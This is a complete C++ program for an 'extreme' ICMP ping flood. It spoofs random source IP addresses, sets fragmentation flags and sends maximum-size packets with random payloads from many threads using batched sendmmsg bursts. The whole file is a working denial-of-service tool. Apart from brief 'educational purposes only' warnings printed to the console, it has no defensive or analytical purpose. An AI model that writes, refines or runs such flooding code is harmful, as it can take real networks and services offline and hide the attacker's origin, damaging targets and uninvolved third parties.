#include <iostream>
#include <cstring>
#include <cstdlib>
#include <unistd.h>
#include <netinet/ip_icmp.h>
#include <netinet/ip.h>
#include <netinet/tcp.h>
#include <arpa/inet.h>
#include <sys/socket.h>
#include <chrono>
#include <signal.h>
#include <iomanip>
#include <errno.h>
#include <thread>
#include <vector>
#include <random>
#include <atomic>
#include <fcntl.h>
#include <sys/socket.h>
#include <array>
#include <memory>

#define BATCH_SIZE 1000       // Maximum batch size for extreme flooding
#define PACKET_POOL_SIZE 5000 // Massive pool size
#define MAX_PACKET_SIZE 1500  // Maximum packet size
#define AGGRESSIVE_MODE 1     // Enable aggressive mode
#define EXTREME_MODE 1        // Enable extreme mode

// Packet structure for pre-generation
struct PreGeneratedPacket
{
    char data[MAX_PACKET_SIZE];
    size_t size;
    struct sockaddr_in dest_addr;
};

// Packet pool for each thread
struct PacketPool
{
    std::vector<PreGeneratedPacket> packets; // Use vector instead of array
    size_t current_index;
    std::mt19937 gen;

    PacketPool(int thread_id, const char *target_ip) : packets(PACKET_POOL_SIZE),
                                                       current_index(0),
                                                       gen(std::random_device{}() + thread_id)
    {
        generate_packet_pool(target_ip);
    }

    void generate_packet_pool(const char *target_ip);
    PreGeneratedPacket &get_next_packet();
};

// Global variables for statistics
volatile bool running = true;
std::atomic<unsigned long long> packet_count(0);
std::atomic<unsigned long long> bytes_sent(0);
auto start_time = std::chrono::high_resolution_clock::now();
const int NUM_THREADS = std::thread::hardware_concurrency() * 8; // Extreme thread count

// Signal handler for graceful exit
void signal_handler(int sig)
{
    running = false;
    auto end_time = std::chrono::high_resolution_clock::now();
    auto duration = std::chrono::duration_cast<std::chrono::milliseconds>(end_time - start_time);

    std::cout << "\n\n=== ATTACK STATISTICS ===\n";
    std::cout << "Total packets sent: " << packet_count.load() << "\n";
    std::cout << "Total bytes sent: " << bytes_sent.load() << " bytes ("
              << bytes_sent.load() / (1024 * 1024) << " MB)\n";
    std::cout << "Duration: " << duration.count() << " ms\n";
    if (duration.count() > 0)
    {
        std::cout << "Average rate: " << (packet_count.load() * 1000) / duration.count() << " packets/sec\n";
        std::cout << "Bandwidth: " << (bytes_sent.load() * 8 * 1000) / (duration.count() * 1024 * 1024) << " Mbps\n";
    }
    std::cout << "Threads used: " << NUM_THREADS << "\n";
    std::cout << "Attack terminated.\n";
    exit(0);
}

// Calculate checksum for IP and ICMP headers
unsigned short checksum(void *b, int len)
{
    unsigned short *buf = (unsigned short *)b;
    unsigned int sum = 0;
    unsigned short result;

    for (; len > 1; len -= 2)
        sum += *buf++;
    if (len == 1)
        sum += *(unsigned char *)buf;

    // Fold 32-bit sum to 16 bits
    sum = (sum >> 16) + (sum & 0xFFFF);
    sum += (sum >> 16);
    result = ~sum;
    return result;
}

// Generate random source IP address
std::string generate_random_ip()
{
    static std::random_device rd;
    static std::mt19937 gen(rd());
    static std::uniform_int_distribution<> dis(1, 254);

    return std::to_string(dis(gen)) + "." +
           std::to_string(dis(gen)) + "." +
           std::to_string(dis(gen)) + "." +
           std::to_string(dis(gen));
}

// Generate realistic source IP (avoid reserved ranges)
std::string generate_realistic_ip(std::mt19937 &gen)
{
    std::uniform_int_distribution<> dis(1, 254);

    // Avoid common reserved ranges
    int first_octet;
    do
    {
        first_octet = dis(gen);
    } while (first_octet == 10 || first_octet == 127 || first_octet == 169 ||
             first_octet == 172 || first_octet == 192);

    return std::to_string(first_octet) + "." +
           std::to_string(dis(gen)) + "." +
           std::to_string(dis(gen)) + "." +
           std::to_string(dis(gen));
}

// Packet pool implementation
void PacketPool::generate_packet_pool(const char *target_ip)
{
    std::uniform_int_distribution<> payload_size_dis(1450, 1472); // Maximum size packets
    std::uniform_int_distribution<> id_dis(1, 65535);
    std::uniform_int_distribution<> seq_dis(1, 65535);
    std::uniform_int_distribution<> icmp_type_dis(0, 4); // Even more ICMP types
    std::uniform_int_distribution<> frag_dis(0, 1);      // Add fragmentation

    struct sockaddr_in dest{};
    dest.sin_family = AF_INET;
    inet_pton(AF_INET, target_ip, &dest.sin_addr);

    for (size_t i = 0; i < PACKET_POOL_SIZE; i++)
    {
        auto &packet = packets[i];
        packet.dest_addr = dest;

        // Maximum size packets for bandwidth consumption
        int payload_size = payload_size_dis(gen);
        int icmp_packet_size = sizeof(struct icmphdr) + payload_size;
        int total_packet_size = sizeof(struct iphdr) + icmp_packet_size;
        packet.size = total_packet_size;

        memset(packet.data, 0, MAX_PACKET_SIZE);

        // IP Header with extreme settings
        struct iphdr *ip_hdr = (struct iphdr *)packet.data;
        ip_hdr->ihl = 5;
        ip_hdr->version = 4;
        ip_hdr->tos = 0xE0; // Maximum priority and precedence
        ip_hdr->tot_len = htons(total_packet_size);
        ip_hdr->id = htons(id_dis(gen));

        // Add fragmentation for some packets to complicate processing
        if (frag_dis(gen) == 0)
        {
            ip_hdr->frag_off = htons(0x2000); // More fragments flag
        }
        else
        {
            ip_hdr->frag_off = 0;
        }

        ip_hdr->ttl = 255; // Maximum TTL
        ip_hdr->protocol = IPPROTO_ICMP;
        ip_hdr->check = 0;

        // Use completely random source IPs for maximum distribution
        std::string src_ip = std::to_string(gen() % 223 + 1) + "." +
                             std::to_string(gen() % 255 + 1) + "." +
                             std::to_string(gen() % 255 + 1) + "." +
                             std::to_string(gen() % 254 + 1);
        inet_pton(AF_INET, src_ip.c_str(), &ip_hdr->saddr);
        ip_hdr->daddr = dest.sin_addr.s_addr;

        // Calculate IP checksum
        ip_hdr->check = checksum(ip_hdr, sizeof(struct iphdr));

        // ICMP Header with maximum variation
        struct icmphdr *icmp_hdr = (struct icmphdr *)(packet.data + sizeof(struct iphdr));
        int icmp_type = icmp_type_dis(gen);
        switch (icmp_type)
        {
        case 0:
            icmp_hdr->type = ICMP_ECHO;
            icmp_hdr->code = 0;
            break;
        case 1:
            icmp_hdr->type = ICMP_TIMESTAMP;
            icmp_hdr->code = 0;
            break;
        case 2:
            icmp_hdr->type = ICMP_INFO_REQUEST;
            icmp_hdr->code = 0;
            break;
        case 3:
            icmp_hdr->type = ICMP_ADDRESS;
            icmp_hdr->code = 0;
            break;
        case 4:
            icmp_hdr->type = ICMP_ECHOREPLY; // Mix replies to confuse
            icmp_hdr->code = 0;
            break;
        }
        icmp_hdr->un.echo.id = htons(id_dis(gen));
        icmp_hdr->un.echo.sequence = htons(seq_dis(gen));
        icmp_hdr->checksum = 0;

        // Fill payload with maximum entropy data
        char *payload = packet.data + sizeof(struct iphdr) + sizeof(struct icmphdr);
        for (int j = 0; j < payload_size; j++)
        {
            payload[j] = gen() % 256; // Random data for maximum processing load
        }

        // Calculate ICMP checksum
        icmp_hdr->checksum = checksum(icmp_hdr, icmp_packet_size);
    }
}

PreGeneratedPacket &PacketPool::get_next_packet()
{
    PreGeneratedPacket &packet = packets[current_index];
    current_index = (current_index + 1) % PACKET_POOL_SIZE;

    // Occasionally update sequence numbers to maintain some variation
    if (current_index % 100 == 0)
    {
        struct icmphdr *icmp_hdr = (struct icmphdr *)(packet.data + sizeof(struct iphdr));
        icmp_hdr->un.echo.sequence = htons(gen() % 65535);
        icmp_hdr->checksum = 0;

        size_t icmp_size = packet.size - sizeof(struct iphdr);
        icmp_hdr->checksum = checksum(icmp_hdr, icmp_size);
    }

    return packet;
}

// Enhanced worker thread with packet pre-generation and sendmmsg
void flood_worker(const char *target_ip, int thread_id)
{
    // Create raw socket for IP packets
    int sock = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
    if (sock < 0)
    {
        std::cerr << "Thread " << thread_id << ": Socket creation failed\n";
        return;
    }

    // Enable IP header inclusion
    int one = 1;
    if (setsockopt(sock, IPPROTO_IP, IP_HDRINCL, &one, sizeof(one)) < 0)
    {
        perror("setsockopt IP_HDRINCL");
        close(sock);
        return;
    }

    // Set socket to non-blocking
    int flags = fcntl(sock, F_GETFL, 0);
    fcntl(sock, F_SETFL, flags | O_NONBLOCK);

    // Increase socket buffer size for maximum throughput
    int buffer_size = 16 * 1024 * 1024; // 16MB for extreme mode
    setsockopt(sock, SOL_SOCKET, SO_SNDBUF, &buffer_size, sizeof(buffer_size));

    // Set socket to highest priority
    int priority = 7; // Highest priority
    setsockopt(sock, SOL_SOCKET, SO_PRIORITY, &priority, sizeof(priority));

    // Enable broadcast for wider impact
    int broadcast = 1;
    setsockopt(sock, SOL_SOCKET, SO_BROADCAST, &broadcast, sizeof(broadcast));

    // Disable socket delays
    int nodelay = 1;
    setsockopt(sock, IPPROTO_TCP, TCP_NODELAY, &nodelay, sizeof(nodelay));

    // Enable socket reuse for better performance
    setsockopt(sock, SOL_SOCKET, SO_REUSEADDR, &one, sizeof(one));

    // Initialize packet pool for this thread
    PacketPool packet_pool(thread_id, target_ip);

    // Use heap allocation for large arrays to avoid stack overflow
    auto msgvec = std::make_unique<struct mmsghdr[]>(BATCH_SIZE);
    auto iovecs = std::make_unique<struct iovec[]>(BATCH_SIZE);

    // Initialize msgvec array
    for (int i = 0; i < BATCH_SIZE; i++)
    {
        msgvec[i].msg_hdr.msg_name = nullptr;
        msgvec[i].msg_hdr.msg_namelen = 0;
        msgvec[i].msg_hdr.msg_iov = &iovecs[i];
        msgvec[i].msg_hdr.msg_iovlen = 1;
        msgvec[i].msg_hdr.msg_control = nullptr;
        msgvec[i].msg_hdr.msg_controllen = 0;
        msgvec[i].msg_hdr.msg_flags = 0;
    }

    unsigned long long local_count = 0;
    unsigned long long local_bytes = 0;
    struct sockaddr_in dest_addr;
    dest_addr.sin_family = AF_INET;
    inet_pton(AF_INET, target_ip, &dest_addr.sin_addr);

    while (running)
    {
        // Prepare batch of packets
        for (int i = 0; i < BATCH_SIZE && running; i++)
        {
            PreGeneratedPacket &packet = packet_pool.get_next_packet();

            iovecs[i].iov_base = packet.data;
            iovecs[i].iov_len = packet.size;
            msgvec[i].msg_hdr.msg_name = &dest_addr;
            msgvec[i].msg_hdr.msg_namelen = sizeof(dest_addr);
        }

        // Send maximum bursts rapidly for extreme attack
        for (int burst = 0; burst < 10 && running; burst++)
        {
            int sent_count = sendmmsg(sock, msgvec.get(), BATCH_SIZE, MSG_DONTWAIT);

            if (sent_count > 0)
            {
                local_count += sent_count;
                // Calculate actual bytes sent
                for (int i = 0; i < sent_count; i++)
                {
                    local_bytes += msgvec[i].msg_len;
                }
            }
            else if (errno == ENOBUFS || errno == EAGAIN)
            {
                // No pause - push through buffer limits
                continue;
            }
            else if (errno != EINTR)
            {
                // Only break on real errors, not interrupts
                if (errno != EPERM)
                { // Ignore permission errors in some cases
                    break;
                }
            }
        }

        // Update global counters very frequently for extreme mode
        if (local_count % 100 == 0)
        {
            packet_count += local_count;
            bytes_sent += local_bytes;
            local_count = 0;
            local_bytes = 0;
        }
    }

    // Update final counts
    packet_count += local_count;
    bytes_sent += local_bytes;
    close(sock);
}

int main(int argc, char *argv[])
{
    if (argc != 2)
    {
        std::cerr << "Enhanced ICMP Ping Flood Tool\n";
        std::cerr << "Usage: sudo " << argv[0] << " <target_ip>\n";
        std::cerr << "WARNING: Only use on systems you own or have permission to test!\n";
        std::cerr << "Features: Multi-threaded, IP spoofing, variable packet sizes, burst sending\n";
        return 1;
    }

    const char *target_ip = argv[1];

    // Check if running as root
    if (getuid() != 0)
    {
        std::cerr << "Error: This tool requires root privileges for raw socket access.\n";
        std::cerr << "Please run with sudo.\n";
        return 1;
    }

    // Set up signal handler for Ctrl+C
    signal(SIGINT, signal_handler);

    std::cout << "=== EXTREME ICMP PING FLOOD TOOL ===\n";
    std::cout << "Target: " << target_ip << "\n";
    std::cout << "Threads: " << NUM_THREADS << " (EXTREME MODE)\n";
    std::cout << "Batch size: " << BATCH_SIZE << " packets per sendmmsg() x10 bursts\n";
    std::cout << "Packet pool: " << PACKET_POOL_SIZE << " pre-generated packets per thread\n";
    std::cout << "Features: Maximum size packets, fragmentation, all ICMP types, no delays\n";
    std::cout << "Press Ctrl+C to stop and see statistics\n";
    std::cout << "WARNING: This is a demonstration tool for educational purposes only!\n\n";

    // Validate target IP
    struct sockaddr_in test_addr{};
    if (inet_pton(AF_INET, target_ip, &test_addr.sin_addr) <= 0)
    {
        std::cerr << "Invalid IP address: " << target_ip << "\n";
        return 1;
    }

    start_time = std::chrono::high_resolution_clock::now();

    std::cout << "[*] Starting EXTREME ICMP flood to " << target_ip << " with " << NUM_THREADS << " threads\n";
    std::cout << "[*] Pre-generating " << (NUM_THREADS * PACKET_POOL_SIZE) << " packets...\n";
    std::cout << "[*] WARNING: This will consume maximum system resources!\n";

    // Create worker threads
    std::vector<std::thread> threads;
    for (int i = 0; i < NUM_THREADS; i++)
    {
        threads.emplace_back(flood_worker, target_ip, i);
    }

    // Monitor progress
    while (running)
    {
        std::this_thread::sleep_for(std::chrono::seconds(1));
        auto current_time = std::chrono::high_resolution_clock::now();
        auto duration = std::chrono::duration_cast<std::chrono::milliseconds>(current_time - start_time);

        if (duration.count() > 1000)
        { // After 1 second
            unsigned long long current_packets = packet_count.load();
            unsigned long long current_bytes = bytes_sent.load();

            std::cout << "Sent " << current_packets << " packets, "
                      << current_bytes / (1024 * 1024) << " MB ("
                      << (current_packets * 1000) / duration.count() << " pkt/s, "
                      << (current_bytes * 8 * 1000) / (duration.count() * 1024 * 1024) << " Mbps)\r"
                      << std::flush;
        }
    }

    // Wait for all threads to finish
    for (auto &thread : threads)
    {
        thread.join();
    }

    signal_handler(SIGINT); // print final stats

    return 0;
}
